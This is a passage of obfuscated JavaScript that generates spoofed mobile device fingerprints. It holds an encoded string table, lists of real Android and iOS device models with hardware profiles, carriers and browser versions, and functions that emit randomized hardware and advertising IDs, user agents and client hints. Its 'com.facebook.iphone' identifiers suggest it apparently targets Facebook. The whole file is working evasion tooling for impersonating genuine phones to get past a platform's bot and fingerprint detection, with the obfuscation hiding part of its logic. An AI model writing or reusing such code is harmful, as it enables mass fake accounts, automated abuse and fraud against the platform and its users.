'icHZzxnZAw9UigLUDMfSAwrHDgvKig9YihbYB3H5igLUDgvYy2vWDcK', 'C2v0', 'Aw1UAhq', 'z2v0', 'y3jLyxrLsgfZAa', 'igfJy291BNrZpq', 'yMf0DgvYEq', 'Aw5PDgLHBenPCgHLCG', 'tM8GBNvTyMvYCYbHDMfPBgfIBgu', 'ugHPBgLWCgLUzxm', 'y09yvwG', 'mtq5', 'oduZ', 'q0vNvNi', 'q2L5ExK', 'y2fWDgnOyq', 'ru5urviGufjpwfK', 'q3vIyq', 'ugfUyw1H', 'ChjPBNrizwfKzxi', 'zg9Jx2LK', '8j+hV/cFH7i', 'AvbOB25Lide2ifbYBYbnyxG', 'mtuY', 'qNrmAxK', 'ntKY', 'tfvQCxK', 'BNvAs0K', 'wMLTyMfID2u', 'q2fTyM9KAwe', 'wdy4nZe', 'BgLNAhq', '8j+hUpcFH7a', 'y29UC29SzvbHDgG', 'zxmTvvKSzxm7Ct0WlJK', 'lcbszxnLBMrZpq', 'wenXBMu', 'ywnJB3vUDfvPza', 'vhLZAwO', 'C29JA3m1', 'BMWTtKWSBMW7Ct0WlJKSzw47Ct0WlJG', 'x19OyMXW', 'y1rqr2y', '8j+hS/cFH78', 'uMvTB3zLihnHDMvKigTLEq', 'zgPyywe', 'AvbOB25Lide2', 'B3jPz2LU', 'nta0', 'iokaLcbYB3v0Aw5NihrVig0UzMfJzwjVB2SUy29TiejSB2TZigzSB3C', 'DMKTvK4SDMK7Ct0WlJKSzw47Ct0WlJG', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'wMfTyMLH', 'iIWG', 'DvrfC2W', 'uePAmteW', 'uhjVEhKGC2vYDMvYihjLDhvYBMvKieHuvfaG', 'mJe2', 'Bu1UtNa', 'vxnLihnHDMvKigTLEq', 'vuTABfC', 'tw9Szg92yq', 'y3vPza', 'Ec1MyI1KzxzPy2uTy3b1', 'u2XsquG', 'zxHWB3j0CW', 'C3bSAwnL', 'icaVif9Fx3WGif9FxYbFif9Fif9Fif8GxYbFxYaGif9FxYbFif9FicaGicb8ihWVicHFkv8Gx18GicbFxYbFica', 'l2fWAs92ms9UDw1IzxjZl3aYl2DLDa', 'tw96AwXSys81lJaGkfGXmtSGtgLUDxGGEdG2xZy0oYbYDJO', 'y29UDgfJDf9WB2LUDf9VChrPB25Z', 'rxfnwNe', 'ChjVEhLgyxvSDa', 'Eejiquy', 'BgPOree', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'qvvusf9nrvrit0q', 'yxiTqKGSyxi7Ct0WlJKSzw47Ct0WlJG', 'uwvPC2y', 'y29TlMjSB2TZlND3DY5JyweUyxiUyxv0Af9TzxrOB2qUyxn5BMm', '8j+hS/cFH64', 'oduW', 'DMLIzxi', 'A2eTr0uSA2e7Ct0WlJKSzw47Ct0WlJG', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44', 'u3qUieHLBgvUyq', 'Ec1MyI1KzxzPy2uTz3b1', 'ksbbChbSzvDLyKTPDc82mduUms4XnsaOs0HutuWSigXPA2uGr2vJA28PifzLCNnPB24V', 'wMvUzxG6igLUDMfSAwqGsLnptG', '8j+hUpcFH78', 'CNr0qLi', '8j+NRsbbChbSzsbtywzHCMKGkg1Hy09ticSGAu9ticSGrKjbtIbjBI1bChaP', 'A20Ts0GSA207Ct0WlJKSzw47Ct0WlJG', '8j+hSpcFH6W', '4PQHief1Dg8GzMv0y2GGzNjVBsbwB2X0EcaOmM9VosK', 'mJa3mdaUsfLqoMnVBwv0x2XVz2DLzg91Df9WA2CUmI4XlI4Uma', 'B0Lcreq', 'rxn3yxrPBMK', 'r2rivNq', 'q29KzuvUDhj5', 'mtDFmL8X', 'w1nftKrDieDsqvbiuuWGrvjst1i6ia', 'ELLTvKO', 'Bg9PC19Zzxr0Aw5NCW', 'BM9FCMvZCg9UC2u', 'BwSTtuSSBwS7Ct0WlJKSzw47Ct0WlJG', 'CunNqMu', 'vxnLCI1bz2vUDa', '8j+hQpcFH6W', 'tLvmta', 'mtj4wLbSEKi', 'tLLND1G', 'qwrKigfUB3rOzxiGCMfUz2u/', 'mtCYmq', 'CMfJzq', 'uwLLAwu', '8j+hT/cFH7q', 'sw54yMe', 'mta0nJGZnJu4mW', 'sLvRANi', 'C2fTC3vUzW', 'AvbOB25LmtuSmW', 'mY4W', 'CLziDLa', 'zNrXyvi', 'vw5RBM93BG', 'mJK4', 'nta1', 'BhyTtfySBhy7Ct0WlJKSzw47Ct0WlJG', 'qw5KB3jYyq', 'yNjVD3nLCLr5Cgu', 'AgfZ', 'z2r1z2jPAdrktvDyEhKYqZb6uZbyrtmTD0n3zc1JD1b4qxG4', 'zw5bve8', '8j+hQpcFH7C', 'mty2na', 'r3jHCgHrtcbLCNjVCG', 'svvYrhq', 'zhLUwLm', 'C2vJlwnOlxbYzwzLCNmTy29SB3iTC2nOzw1L', 'q1vsuKvovf9iv0Le', 'BgrNCxO', 'sxvqy2i', 'y2fWDgnOyt0', 'veLnrvPptKu6ifjLC29SDMvKigzYB20GChjVEhKGx3PVBMvFiokgKIa', 'C2vHCMnOqwnJB3vUDa', 'vgfPD2fU', 'ixjLzG', 'BgTJqxO', 'mtq4', 'yxfpueK', 't1rqx1nftKq', 's3HTuwC', 'ueHptKu', 'mtDFnq', 'y2XPzw50txv0yxrPB25jza', 'C29JtwfUDwzHy3r1CMvY', 'AhDPza', 'zMLUza', 'mJCXmdiWmtGYmtyXndKWnZa', 'otCY', '8j+hQVcFH7GGu3bHBMLZAcaOzxmTrvmSzxm7Ct0WlJKP', 'mJqZ', 'iMn1AwqIksWGkgjRlMfJDgLVBI5HCNjHEs5nywTLlcaIqvK', 'tMLNzxjPyq', 'mtuW', 'nteWlJaUmc4Yoc4Xmtu', 'wu1Uvxu', 'u0vmrunux0fdq09vtLq', 'y29TzxqUzMj3zwiUq29TzxrdqufbuKnVzgvfBNrYEvjVDxrL', 'r0jlDMO', 'DLLvqNy', 'wMvUzxGGBMv0oIa', 'Dw5Oyw5KBgvKuMvQzwn0Aw9U', 'qwzNAgfUAxn0yw4', 'kgvTChr5kq', 'mJm2', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'mJuXnJCWnZK5ndK2nJeYmJa', 'mJCWmti5nJKXotGZodaWnZe', 'EwrXwfG', 'x3bYB2nLC3m', 'DxnLCKfNzw50'];
  fn1 = function () {
    return v333;
  };
  return fn1();
}
v4.major = 0x8a, v4.build = 0x1c24, v4.minPatch = 0x32, v4.maxPatch = 0xb4;
const v5 = {};
v5.major = 0x8b, v5.build = 0x1c5a, v5.minPatch = 0x32, v5.maxPatch = 0xb4;
const v6 = {};
v6.major = 0x8c, v6.build = 0x1c7e, v6.minPatch = 0x32, v6.maxPatch = 0xb4;
const v7 = {};
v7.major = 0x8d, v7.build = 0x1cbe, v7.minPatch = 0x32, v7.maxPatch = 0xb4;
const v8 = {};
v8.major = 0x8e, v8.build = 0x1cf3, v8.minPatch = 0x32, v8.maxPatch = 0xb4;
const v9 = {};
v9.major = 0x8f, v9.build = 0x1d2e, v9.minPatch = 0x32, v9.maxPatch = 0xb4;
const v10 = {};
v10.major = 0x90, v10.build = 0x1d66, v10.minPatch = 0x32, v10.maxPatch = 0xb4;
const v11 = {};
v11.major = 0x91, v11.build = 0x1d97, v11.minPatch = 0x32, v11.maxPatch = 0xb4;
const v12 = {};
v12.major = 0x92, v12.build = 0x1dca, v12.minPatch = 0x32, v12.maxPatch = 0xb4;
const v13 = {};
v13.major = 0x93, v13.build = 0x1dfe, v13.minPatch = 0x32, v13.maxPatch = 0xb4;
const v14 = {};
v14.major = 0x94, v14.build = 0x1e38, v14.minPatch = 0x32, v14.maxPatch = 0xb4;
const v15 = {};
v15.major = 0x95, v15.build = 0x1e73, v15.minPatch = 0x32, v15.maxPatch = 0xb4;
const v16 = {};
v16.major = 0x96, v16.build = 0x1ebf, v16.minPatch = 0x32, v16.maxPatch = 0xb4;
const v17 = {};
v17.major = 0x97, v17.build = 0x1ef2, v17.minPatch = 0x32, v17.maxPatch = 0xb4;
const v18 = {};
v18.major = 0x98, v18.build = 0x1f29, v18.minPatch = 0x28, v18.maxPatch = 0xa0;
const v19 = {};
v19.major = 0x99, v19.build = 0x1f5c, v19.minPatch = 0x1e, v19.maxPatch = 0x96;
const v20 = {};
v20.major = 0x9a, v20.build = 0x1f95, v20.minPatch = 0x14, v20.maxPatch = 0x78;
const CHROME_VERSIONS = [v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20],
  v21 = {};
v21.ver = "24.0", v21.chrome = "149.0.7795.136";
const v22 = {};
v22.ver = "25.0", v22.chrome = "150.0.7871.114";
const v23 = {};
v23.ver = "26.0", v23.chrome = "151.0.7922.150";
const v24 = {};
v24.ver = "27.0", v24.chrome = "152.0.7977.64";
const SAMSUNG_VERSIONS = [v21, v22, v23, v24],
  v25 = {};
v25.brand = "Samsung", v25.model = "SM-S938B", v25.os = '15';
const v26 = {};
v26.brand = "Samsung", v26.model = "SM-S928B", v26.os = '14';
const v27 = {};
v27.brand = "Samsung", v27.model = "SM-S918B", v27.os = '14';
const v28 = {};
v28.brand = "Samsung", v28.model = "SM-S926B", v28.os = '14';
const v29 = {};
v29.brand = "Samsung", v29.model = "SM-S921B", v29.os = '14';
const v30 = {};
v30.brand = "Samsung", v30.model = "SM-S908B", v30.os = '13';
const v31 = {};
v31.brand = "Samsung", v31.model = "SM-S901B", v31.os = '13';
const v32 = {};
v32.brand = "Samsung", v32.model = "SM-G991B", v32.os = '13';
const v33 = {};
v33.brand = "Samsung", v33.model = "SM-A556B", v33.os = '14';
const v34 = {};
v34.brand = "Samsung", v34.model = "SM-A546B", v34.os = '13';
const v35 = {};
v35.brand = "Google", v35.model = "Pixel 9 Pro XL", v35.os = '15';
const v36 = {};
v36.brand = "Google", v36.model = "Pixel 9 Pro", v36.os = '15';
const v37 = {};
v37.brand = "Google", v37.model = "Pixel 9", v37.os = '15';
const v38 = {};
v38.brand = "Google", v38.model = "Pixel 8 Pro", v38.os = '14';
const v39 = {};
v39.brand = "Google", v39.model = "Pixel 8", v39.os = '14';
const v40 = {};
v40.brand = "Google", v40.model = "Pixel 7a", v40.os = '14';
const v41 = {};
v41.brand = "Xiaomi", v41.model = "24129PN74C", v41.os = '15';
const v42 = {};
v42.brand = "Xiaomi", v42.model = "24031PN0DC", v42.os = '14';
const v43 = {};
v43.brand = "Xiaomi", v43.model = "23117PN60G", v43.os = '14';
const v44 = {};
v44.brand = "Xiaomi", v44.model = "2210132C", v44.os = '13';
const v45 = {};
v45.brand = "OnePlus", v45.model = "PJZ110", v45.os = '15';
const v46 = {};
v46.brand = "OnePlus", v46.model = "CPH2609", v46.os = '14';
const v47 = {};
v47.brand = "OnePlus", v47.model = "CPH2581", v47.os = '14';
const v48 = {};
v48.brand = "OnePlus", v48.model = "IN2023", v48.os = '13';
const v49 = {};
v49.brand = "Sony", v49.model = "XQ-FS54", v49.os = '15';
const v50 = {};
v50.brand = "Sony", v50.model = "XQ-EC54", v50.os = '14';
const ANDROID_DEVICES = [v25, v26, v27, v28, v29, v30, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50],
  v51 = {};
v51.name = "iPhone 16 Pro Max", v51.os = "18_3", v51.version = "18.3", v51.model = "iPhone17,2", v51.build = "22D60", v51.devCode = "iPhone", v51.app = "com.facebook.iphone", v51.density = "3.0", v51.w = 0x1b8, v51.h = 0x3bc;
const v52 = {};
v52.name = "iPhone 16 Pro", v52.os = "18_2", v52.version = "18.2", v52.model = "iPhone17,1", v52.build = "22C152", v52.devCode = "iPhone", v52.app = "com.facebook.iphone", v52.density = "3.0", v52.w = 0x192, v52.h = 0x36a;
const v53 = {};
v53.name = "iPhone 16", v53.os = "18_1", v53.version = "18.1", v53.model = "iPhone17,3", v53.build = "22B83", v53.devCode = "iPhone", v53.app = "com.facebook.iphone", v53.density = "3.0", v53.w = 0x189, v53.h = 0x354;
const v54 = {};
v54.name = "iPhone 15 Pro Max", v54.os = "17_5", v54.version = "17.5", v54.model = "iPhone15,3", v54.build = "21F79", v54.devCode = "iPhone", v54.app = "com.facebook.iphone", v54.density = "3.0", v54.w = 0x1ae, v54.h = 0x3a4;
const v55 = {};
v55.name = "iPhone 15 Pro", v55.os = "17_4", v55.version = "17.4", v55.model = "iPhone15,2", v55.build = "21E219", v55.devCode = "iPhone", v55.app = "com.facebook.iphone", v55.density = "3.0", v55.w = 0x189, v55.h = 0x354;
const v56 = {};
v56.name = "iPhone 15", v56.os = "17_5_1", v56.version = "17.5.1", v56.model = "iPhone15,4", v56.build = "21F90", v56.devCode = "iPhone", v56.app = "com.facebook.iphone", v56.density = "3.0", v56.w = 0x189, v56.h = 0x354;
const v57 = {};
v57.name = "iPhone 14 Pro Max", v57.os = "16_5", v57.version = "16.5", v57.model = "iPhone15,3", v57.build = "20F66", v57.devCode = "iPhone", v57.app = "com.facebook.iphone", v57.density = "2.0", v57.w = 0x1ae, v57.h = 0x34c;
const v58 = {};
v58.name = "iPhone 14", v58.os = "17_2_1", v58.version = "17.2.1", v58.model = "iPhone14,7", v58.build = "21C66", v58.devCode = "iPhone", v58.app = "com.facebook.iphone", v58.density = "3.0", v58.w = 0x186, v58.h = 0x34c;
const v59 = {};
v59.name = "iPhone 13", v59.os = "16_6", v59.version = "16.6", v59.model = "iPhone14,5", v59.build = "20G75", v59.devCode = "iPhone", v59.app = "com.facebook.iphone", v59.density = "3.0", v59.w = 0x186, v59.h = 0x34c;
const v60 = {};
v60.name = "iPad Pro M4", v60.os = "18_2", v60.version = "18.2", v60.model = "iPad16,3", v60.build = "22C152", v60.devCode = "iPad", v60.app = "com.facebook.ipad", v60.isTablet = true, v60.density = "2.0", v60.w = 0x400, v60.h = 0x556;
const v61 = {};
v61.name = "iPad OS 18", v61.os = "18_0", v61.version = "18.0", v61.model = "iPad13,1", v61.build = "22A3354", v61.devCode = "iPad", v61.app = "com.facebook.ipad", v61.isTablet = true, v61.density = "2.0", v61.w = 0x32a, v61.h = 0x556;
const v62 = {};
v62.name = "iPad Air 5", v62.os = "17_5", v62.version = "17.5", v62.model = "iPad13,17", v62.build = "21F79", v62.devCode = "iPad", v62.app = "com.facebook.ipad", v62.isTablet = true, v62.density = "2.0", v62.w = 0x334, v62.h = 0x49c;
const IOS_DEVICES = [v51, v52, v53, v54, v55, v56, v57, v58, v59, v60, v61, v62],
  v63 = {};
v63.model = "SM-S938B", v63.cpu = "Snapdragon 8 Elite", v63.gpu = "Adreno 830", v63.ram = 0x10, v63.dpr = 0x3, v63.group = "high", v63.soc = "Qualcomm";
const v64 = {};
v64.model = "AI2401", v64.cpu = "Snapdragon 8 Gen 3", v64.gpu = "Adreno 750", v64.ram = 0x18, v64.dpr = 0x3, v64.group = "high", v64.soc = "Qualcomm";
const v65 = {};
v65.model = "CPH2581", v65.cpu = "Snapdragon 8 Gen 3", v65.gpu = "Adreno 750", v65.ram = 0x10, v65.dpr = 3.5, v65.group = "high", v65.soc = "Qualcomm";
const v66 = {};
v66.model = "SM-S911B", v66.cpu = "Snapdragon 8 Gen 2", v66.gpu = "Adreno 740", v66.ram = 0x8, v66.dpr = 2.75, v66.group = "high", v66.soc = "Qualcomm";
const v67 = {};
v67.model = "CPH2449", v67.cpu = "Snapdragon 8 Gen 2", v67.gpu = "Adreno 740", v67.ram = 0x10, v67.dpr = 3.5, v67.group = "high", v67.soc = "Qualcomm";
const v68 = {};
v68.model = "2304FPN6DG", v68.cpu = "Snapdragon 8 Gen 2", v68.gpu = "Adreno 740", v68.ram = 0xc, v68.dpr = 3.5, v68.group = "high", v68.soc = "Qualcomm";
const v69 = {};
v69.model = "XQ-DQ72", v69.cpu = "Snapdragon 8 Gen 3", v69.gpu = "Adreno 750", v69.ram = 0xc, v69.dpr = 0x3, v69.group = "high", v69.soc = "Qualcomm";
const v70 = {};
v70.model = "CPH2601", v70.cpu = "MediaTek Dimensity 9400", v70.gpu = "Immortalis-G925 MC12", v70.ram = 0x10, v70.dpr = 3.5, v70.group = "high", v70.soc = "MediaTek";
const v71 = {};
v71.model = "CPH2551", v71.cpu = "MediaTek Dimensity 9300", v71.gpu = "Immortalis-G720 MC12", v71.ram = 0x10, v71.dpr = 3.5, v71.group = "high", v71.soc = "MediaTek";
const v72 = {};
v72.model = "CPH2505", v72.cpu = "MediaTek Dimensity 8200", v72.gpu = "Mali-G610 MC6", v72.ram = 0xc, v72.dpr = 2.75, v72.group = "high", v72.soc = "MediaTek";
const v73 = {};
v73.model = "V2316", v73.cpu = "MediaTek Dimensity 9300", v73.gpu = "Immortalis-G720 MC12", v73.ram = 0x10, v73.dpr = 0x3, v73.group = "high", v73.soc = "MediaTek";
const v74 = {};
v74.model = "23113RKC6G", v74.cpu = "MediaTek Dimensity 7200-Ultra", v74.gpu = "Mali-G610 MC4", v74.ram = 0x8, v74.dpr = 2.75, v74.group = "high", v74.soc = "MediaTek";
const v75 = {};
v75.model = "NOH-NX9", v75.cpu = "Kirin 9000", v75.gpu = "Mali-G78 MP24", v75.ram = 0x8, v75.dpr = 0x3, v75.group = "high", v75.soc = "HiSilicon";
const v76 = {};
v76.model = "SM-A155F", v76.cpu = "MediaTek Helio G99", v76.gpu = "Mali-G57 MC2", v76.ram = 0x4, v76.dpr = 0x2, v76.group = "medium", v76.soc = "MediaTek";
const v77 = {};
v77.model = "V2320", v77.cpu = "MediaTek Dimensity 6020", v77.gpu = "Mali-G57 MC2", v77.ram = 0x4, v77.dpr = 0x2, v77.group = "medium", v77.soc = "MediaTek";
const v78 = {};
v78.model = "X6871", v78.cpu = "MediaTek Dimensity 8200", v78.gpu = "Mali-G610 MC6", v78.ram = 0x8, v78.dpr = 2.75, v78.group = "high", v78.soc = "MediaTek";
const v79 = {};
v79.model = "Pixel 9 Pro", v79.cpu = "Google Tensor G4", v79.gpu = "Mali-G715 MC7", v79.ram = 0x10, v79.dpr = 0x3, v79.group = "high", v79.soc = "Google";
const v80 = {};
v80.model = "Pixel 8 Pro", v80.cpu = "Google Tensor G3", v80.gpu = "Mali-G715 Immortalis MC10", v80.ram = 0xc, v80.dpr = 2.75, v80.group = "high", v80.soc = "Google";
const v81 = {};
v81.model = "Pixel 8", v81.cpu = "Google Tensor G3", v81.gpu = "Mali-G715 Immortalis MC10", v81.ram = 0x8, v81.dpr = 2.75, v81.group = "high", v81.soc = "Google";
const ANDROID_DEVICE_PROFILES = [v63, v64, v65, v66, v67, v68, v69, v70, v71, v72, v73, v74, v75, v76, v77, v78, v79, v80, v81],
  v82 = {};
v82.model = "iPhone17,2", v82.family = "iPhone", v82.osVer = "18.3", v82.cpu = "Apple A18 Pro", v82.gpu = "Apple G18P (6-core)", v82.ram = 0x8, v82.dpr = 0x3, v82.group = "high", v82.soc = "Apple";
const v83 = {};
v83.model = "iPhone17,1", v83.family = "iPhone", v83.osVer = "18.2", v83.cpu = "Apple A18 Pro", v83.gpu = "Apple G18P (6-core)", v83.ram = 0x8, v83.dpr = 0x3, v83.group = "high", v83.soc = "Apple";
const v84 = {};
v84.model = "iPhone16,2", v84.family = "iPhone", v84.osVer = "18.3", v84.cpu = "Apple A17 Pro", v84.gpu = "Apple G17P (6-core)", v84.ram = 0x8, v84.dpr = 0x3, v84.group = "high", v84.soc = "Apple";
const v85 = {};
v85.model = "iPhone16,1", v85.family = "iPhone", v85.osVer = "18.2", v85.cpu = "Apple A17 Pro", v85.gpu = "Apple G17P (6-core)", v85.ram = 0x8, v85.dpr = 0x3, v85.group = "high", v85.soc = "Apple";
const v86 = {};
v86.model = "iPhone15,4", v86.family = "iPhone", v86.osVer = "18.1", v86.cpu = "Apple A16 Bionic", v86.gpu = "Apple G16 (5-core)", v86.ram = 0x6, v86.dpr = 0x3, v86.group = "medium", v86.soc = "Apple";
const v87 = {};
v87.model = "iPhone15,3", v87.family = "iPhone", v87.osVer = "18.1", v87.cpu = "Apple A16 Bionic", v87.gpu = "Apple G16 (5-core)", v87.ram = 0x6, v87.dpr = 0x3, v87.group = "medium", v87.soc = "Apple";
const v88 = {};
v88.model = "iPhone14,8", v88.family = "iPhone", v88.osVer = "17.2", v88.cpu = "Apple A15 Bionic", v88.gpu = "Apple G15 (5-core)", v88.ram = 0x6, v88.dpr = 0x3, v88.group = "medium", v88.soc = "Apple";
const v89 = {};
v89.model = "iPhone14,2", v89.family = "iPhone", v89.osVer = "17.5", v89.cpu = "Apple A15 Bionic", v89.gpu = "Apple G15 (5-core)", v89.ram = 0x6, v89.dpr = 0x3, v89.group = "medium", v89.soc = "Apple";
const v90 = {};
v90.model = "iPhone13,3", v90.family = "iPhone", v90.osVer = "16.7", v90.cpu = "Apple A14 Bionic", v90.gpu = "Apple G14 (4-core)", v90.ram = 0x6, v90.dpr = 0x3, v90.group = "medium", v90.soc = "Apple";
const v91 = {};
v91.model = "iPhone12,1", v91.family = "iPhone", v91.osVer = "16.6", v91.cpu = "Apple A13 Bionic", v91.gpu = "Apple G13 (4-core)", v91.ram = 0x4, v91.dpr = 0x2, v91.group = "medium", v91.soc = "Apple";
const IOS_DEVICE_PROFILES = [v82, v83, v84, v85, v86, v87, v88, v89, v90, v91],
  v92 = {};
v92.ver = "18_5", v92.build = "22F76", v92.osTag = "18.5";
const v93 = {};
v93.ver = "18_3", v93.build = "22D60", v93.osTag = "18.3";
const v94 = {};
v94.ver = "18_2", v94.build = "22C152", v94.osTag = "18.2";
const v95 = {};
v95.ver = "18_1", v95.build = "22B83", v95.osTag = "18.1";
const v96 = {};
v96.ver = "17_4_1", v96.build = "21E236", v96.osTag = "17.4.1";
const v97 = {};
v97.ver = "17_2", v97.build = "21C62", v97.osTag = "17.2";
const v98 = {};
v98.ver = "16_2", v98.build = "20C65", v98.osTag = "16.2";
const v99 = {};
v99.ver = "15_4", v99.build = "19E241", v99.osTag = "15.4";
const IOS_VERSIONS_FP = [v92, v93, v94, v95, v96, v97, v98, v99],
  ANDROID_OS_VERSIONS = ['12', '13', '14', '15'],
  GPS_VERSIONS = ["24.08.12", "24.10.15", "24.15.18", "24.20.13", "24.23.35", "24.26.31", "24.33.32", "24.36.15", "24.39.14", "24.42.12", "24.45.17", "25.02.34", "25.08.13", "26.04.11"],
  IT_OPERATORS = ["WindTre", "TIM IT", "Vodafone IT", "Iliad IT"],
  US_OPERATORS = ["T-Mobile", "AT&T", "Verizon", "Google Fi"],
  GENERIC_OPERATORS = ["Vodafone", "Orange", "T-Mobile", "Claro", "Rogers", "Glo", "MTN"],
  CONNECTION_TYPES_FP = ["WIFI", "MOBILE_LTE", "MOBILE_5G"];
function getSimOperators(v334) {
  if (v334 === 'IT') return IT_OPERATORS;
  if (v334 === 'US') return US_OPERATORS;
  return GENERIC_OPERATORS;
}
function generateDeviceFingerprint(v335, v336) {
  const v337 = v335 === "android" ? "android" : v335 === "ios" ? "ios" : Math.random() > 0.4 ? "android" : "ios",
    v338 = CONNECTION_TYPES_FP[Math.floor(Math.random() * CONNECTION_TYPES_FP.length)];
  const v339 = Math.floor(Math.random() * 0x50) + 0xf,
    v340 = Math.random() > 0.7 ? 0x1 : 0x0,
    v341 = Math.floor(Math.random() * 0x3d090) + 0x7530,
    v342 = Math.floor(Math.random() * v341 * 0.7);
  const v343 = Math.floor(Math.random() * 0xaba9500) + 0xe4e1c0,
    v344 = v336 || IT_OPERATORS;
  if (v337 === "android") {
    const v345 = ANDROID_DEVICE_PROFILES[Math.floor(Math.random() * ANDROID_DEVICE_PROFILES.length)],
      v346 = ANDROID_OS_VERSIONS[Math.floor(Math.random() * ANDROID_OS_VERSIONS.length)],
      v347 = v344[Math.floor(Math.random() * v344.length)],
      v348 = GPS_VERSIONS[Math.floor(Math.random() * GPS_VERSIONS.length)];
    return {
      'platform': "android",
      'androidVersion': v346,
      'model': v345.model,
      'cpu': v345.cpu,
      'gpu': v345.gpu,
      'ram': v345.ram,
      'dpr': v345.dpr,
      'deviceGroup': v345.group,
      'socManufacturer': v345.soc,
      'hwid': uuid(),
      'bootId': uuid(),
      'advertisingId': uuid(),
      'sessionId': uuid(),
      'connType': v338,
      'networkQuality': "EXCELLENT",
      'simOperator': v347,
      'battery': v339,
      'isCharging': v340,
      'uptime': v341,
      'fgTime': v342,
      'bandwidth': v343,
      'gpsVersion': v348
    };
  } else {
    const v349 = IOS_DEVICE_PROFILES[Math.floor(Math.random() * IOS_DEVICE_PROFILES.length)],
      v350 = IOS_VERSIONS_FP[Math.floor(Math.random() * IOS_VERSIONS_FP.length)],
      v351 = v344[Math.floor(Math.random() * v344.length)],
      fn5 = () => uuid().toUpperCase();
    return {
      'platform': "ios",
      'iosVersion': v350,
      'model': v349.model,
      'family': v349.family,
      'osVersion': v349.osVer,
      'cpu': v349.cpu,
      'gpu': v349.gpu,
      'ram': v349.ram,
      'dpr': v349.dpr,
      'deviceGroup': v349.group,
      'socManufacturer': v349.soc,
      'hwid': uuid(),
      'bootId': fn5(),
      'advertisingId': fn5(),
      'sessionId': uuid(),
      'connType': v338,
      'networkQuality': "EXCELLENT",
      'simOperator': v351,
      'battery': v339,
      'isCharging': v340,
      'uptime': v341,
      'fgTime': v342,
      'bandwidth': v343
    };
  }
}
const v100 = {};
v100["138"] = "\"Not=A?Brand\";v=\"99\"", v100["139"] = "\"Not;A=Brand\";v=\"8\"", v100["140"] = "\"Not(A;Brand\";v=\"24\"", v100["141"] = "\"Not A(Brand\";v=\"99\"", v100["142"] = "\"Not_A Brand\";v=\"8\"", v100["143"] = "\"Not;A=Brand\";v=\"24\"", v100["144"] = "\"Not=A?Brand\";v=\"99\"", v100["145"] = "\"Not;A=Brand\";v=\"8\"", v100["146"] = "\"Not;A=Brand\";v=\"24\"", v100["147"] = "\"Not_A Brand\";v=\"8\"", v100["148"] = "\"Not A(Brand\";v=\"99\"", v100["149"] = "\"Not(A;Brand\";v=\"24\"", v100["150"] = "\"Not;A=Brand\";v=\"8\"", v100["151"] = "\"Not=A?Brand\";v=\"99\"", v100["152"] = "\"Not?A_Brand\";v=\"24\"", v100["153"] = "\"Not_A Brand\";v=\"8\"", v100["154"] = "\"Not=A?Brand\";v=\"99\"";
const GREASE_MAP_FP = v100;
function getRandomClient(v352, v353) {
  let v354 = v352;
  (!v354 || v354 === SELECTED_BROWSER) && (SELECTED_BROWSERS && SELECTED_BROWSERS.length > 0x1 ? v354 = SELECTED_BROWSERS[Math.floor(Math.random() * SELECTED_BROWSERS.length)] : v354 = SELECTED_BROWSER);
  const v355 = v354 === "android" || v354 === "ios";
  if (!v355) {
    const v358 = getRandomUserAgent(v354),
      v359 = {
        ...v358
      };
    return v359.device = null, v359;
  }
  const v356 = v354 === "android" ? "android" : v354 === "ios" ? "ios" : "random",
    v357 = generateDeviceFingerprint(v356, v353 || IT_OPERATORS);
  if (v357.platform === "ios") {
    const {
        iosVersion: v360
      } = v357,
      v361 = typeof mfbGenIosUA === "function" ? mfbGenIosUA() : "Mozilla/5.0 (iPhone; CPU iPhone OS " + v360.ver + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v360.ver.replace(/_/g, '.').split('.').slice(0x0, 0x2).join('.') + ".0 Mobile/" + v360.build + " Safari/605.1",
      v362 = {};
    v362.w = 0x186, v362.h = 0x34c, v362.dpr = v357.dpr, v362.cores = 0x8, v362.ram = v357.ram;
    const v363 = {};
    return v363.name = "iOS Safari (iPhone)", v363.userAgent = v361, v363.browserType = "safari", v363.isMobile = true, v363.clientHints = {}, v363.hw = v362, v363.device = v357, v363;
  } else {
    const v364 = Math.floor(Math.random() * 6) + 0x94,
      v365 = Math.floor(Math.random() * 0xc8) + 0x1edc,
      v366 = Math.floor(Math.random() * 0x96) + 0x28,
      v367 = GREASE_MAP_FP[v364] || "\"Not?A_Brand\";v=\"24\"",
      v368 = "Mozilla/5.0 (Linux; Android " + v357.androidVersion + ';\x20' + v357.model + " Build/TP1A.231011.067) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v364 + ".0.0.0 Mobile Safari/537.36";
    return {
      'name': "Android Chrome",
      'userAgent': v368,
      'browserType': "chrome",
      'isMobile': true,
      'clientHints': {
        'sec-ch-ua': "\"Chromium\";v=\"" + v364 + "\", " + v367 + ", \"Google Chrome\";v=\"" + v364 + '\x22',
        'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v364 + ".0." + v365 + '.' + v366 + "\", " + v367.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v364 + ".0." + v365 + '.' + v366 + '\x22',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua-platform-version': '\x22' + v357.androidVersion + ".0.0\"",
        'sec-ch-ua-model': '\x22' + v357.model + '\x22',
        'sec-gpc': '1'
      },
      'hw': {
        'w': 0x19c,
